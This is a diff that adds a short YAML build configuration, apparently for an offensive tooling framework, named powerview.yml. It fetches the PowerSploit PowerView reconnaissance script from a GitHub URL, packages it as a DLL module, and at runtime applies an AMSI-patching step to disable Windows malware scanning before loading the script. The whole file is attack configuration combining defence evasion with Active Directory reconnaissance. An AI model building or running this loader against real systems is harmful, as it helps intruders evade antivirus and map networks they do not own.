@@ -1,0 +1,13 @@
+# powerview.yml
+schema: 6
+name: powerview
+build:
+  payloads:
+    pv: { source: "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1", format: powershell }
+  output:
+    kind: psmodule
+    path: ./dist/powerview.picaro.dll
+runtime:
+  - technique: patch_amsi
+  - technique: import_powermodule
+    params: { payload: pv }
